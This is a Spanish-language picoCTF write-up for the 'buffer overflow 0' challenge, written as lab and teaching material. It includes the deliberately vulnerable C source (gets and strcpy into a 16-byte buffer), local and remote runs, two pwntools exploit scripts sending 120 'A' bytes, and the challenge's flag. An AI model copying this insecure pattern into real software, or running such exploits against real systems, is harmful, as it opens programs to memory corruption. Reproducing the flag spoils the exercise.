	kali# buffer overflow 0

Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/522/vuln). You can view source [here](https://artifacts.picoctf.net/c/522/vuln.c). And connect with it using: `nc saturn.picoctf.net 51110`

h1: How can you trigger the flag to print?

h2: If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

h3:Run `man gets` and read the BUGS section. How many characters can the program really read?

## Solucion
### Analisis
- Analizamos el codigo fuente en C que se nos da
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this di>
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal han>
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

- se lee la bandera de un archivo en disco en la variable flag, con un limite de 64 caracteres.
- se establece una funcion para manegar SIGSEGV, SIGSEGV es el error que el sistema lanza cuando se intenta acceder a memoria no válida.
	- si eso sucede la funcion sisegv maneja el problema y nos imprime la bandera
- se pide una entrada, en un bufer inicial de 100
- se manda a la funcion **vul** esta la copia a un buffer de 16 caracteres y aqui es donde ocurre el desbordamiento

### Ejecutamos
- Sin desbordar
```bash  
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow0]
└─$ chmod +x vuln
                                             
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow0]
└─$ ./vuln
Input: sin desborde
The program will exit now
                                                         
```

- desbordamos
```
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow0]
└─$ ./vuln       
Input: aqui si debe haber desborde nos pasamos de 16
flag{}

```

- ahora remoto
```
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow0]
└─$ nc saturn.picoctf.net 51110
Input: desbordando desde el servidor
picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}
```

### Otra solucion con pwntools
- el exploit local

```python
from pwn import *

p = process('./vuln')
print( p.recv().decode() )

overflow  = b'A' * 120
print('[*] Enviando overflow...')
p.sendline(overflow)

print( p.recvall().decode() )
print('[*] Terminado.')

p.close()


```

- exploit remoto

```python
from pwn import *

# remoto
p = remote('saturn.picoctf.net', 51110)

# local
#p = process('./vuln')

print( p.recv().decode() )

overflow  = b'A' * 120
print('[*] Enviando overflow...')
p.sendline(overflow)
print('[*] Terminado.')
print( p.recvall().decode() )

p.close()
```

```bash
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow0]
└─$ python exp.py
[+] Opening connection to saturn.picoctf.net on port 51110: Done
Input: 
[*] Enviando overflow...
[*] Terminado.
[+] Receiving all data: Done (43B)
[*] Closed connection to saturn.picoctf.net port 51110
picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff
```